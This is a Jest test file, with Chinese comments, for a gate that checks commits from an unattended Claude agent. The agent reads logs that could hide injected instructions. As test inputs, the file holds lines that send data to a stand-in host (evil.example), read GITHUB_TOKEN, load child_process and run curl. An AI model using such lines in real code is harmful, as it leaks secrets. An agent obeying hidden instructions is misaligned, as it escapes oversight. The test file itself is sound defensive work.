/**
 * 自動修正推上去之前的固定檢查。施工日誌與承辦人說明都會被無人看管的 Claude 讀,
 * 若有人藏了指令,這裡是最後一道:不在範圍內的檔案、能碰系統/網路的寫法一律擋下。
 * 用真的 git 建暫存 repo,模擬 Claude 的 commit。
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');
const { check } = require('../scripts/fix-queue-gate');

const PARSER = 'app/server/parsers/vendors/samples/jiumu.pmisparser.js';
let dir;
let base;
const git = (...args) => execFileSync('git', args, { cwd: dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim();
const write = (rel, text) => {
  fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
  fs.writeFileSync(path.join(dir, rel), text);
};
const commit = () => { git('add', '-A'); git('commit', '-qm', 'claude'); };

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pmis-gate-'));
  git('init', '-q');
  git('config', 'user.email', 't@t'); git('config', 'user.name', 't');
  write(PARSER, 'const x = 395;\n');
  write('app/server/daily-log-routes.js', '// routes\n');
  commit();
  base = git('rev-parse', 'HEAD');
});
afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

test('只改讀取器與測試、沒有危險寫法 → 通過', () => {
  write(PARSER, 'const x = cumulativeQtyHeader ? cumulativeQtyHeader.x : 395;\nwhile ((m = re.exec(s))) n++;\n');
  write('app/tests/parser-jiumu.test.js', "const path = require('path');\nprocess.env.PMIS_DATA_DIR = 'x';\n");
  write('app/tests/fixtures/jiumu-new.pdf', '%PDF');
  commit();
  expect(check(dir, base)).toEqual([]);
});

test('改到範圍外的檔案(上傳流程、workflow、套件清單)→ 擋下', () => {
  write('app/server/daily-log-routes.js', '// changed\n');
  write('.github/workflows/x.yml', 'on: push');
  write('app/package.json', '{}');
  commit();
  const p = check(dir, base);
  expect(p).toEqual(expect.arrayContaining([
    expect.stringContaining('app/server/daily-log-routes.js'),
    expect.stringContaining('.github/workflows/x.yml'),
    expect.stringContaining('app/package.json'),
  ]));
});

test.each([
  ["const cp = require('child_process');", 'require'],
  ["fetch('https://evil.example/' + data);", '網路存取'],
  ['const k = process.env.GITHUB_TOKEN;', 'process'],
  ["new Function('return 1')();", '動態執行'],
  ['globalThis.x = 1;', '全域物件'],
])('讀取器新增 %s → 擋下(%s)', (line, label) => {
  write(PARSER, `const x = 395;\n${line}\n`);
  commit();
  expect(check(dir, base).join('\n')).toContain(label);
});

test('測試檔也不准連網或執行外部程式', () => {
  write('app/tests/parser-jiumu.test.js', "require('child_process').execSync('curl x');\n");
  commit();
  expect(check(dir, base).length).toBeGreaterThan(0);
});

test('註解裡提到 require 不算', () => {
  write(PARSER, "const x = 395;\n// 讀取器絕不 require 任何東西\n");
  commit();
  expect(check(dir, base)).toEqual([]);
});

test('Claude 什麼都沒改 → 不算修好', () => {
  expect(check(dir, base)).toEqual(['沒有任何改動']);
});
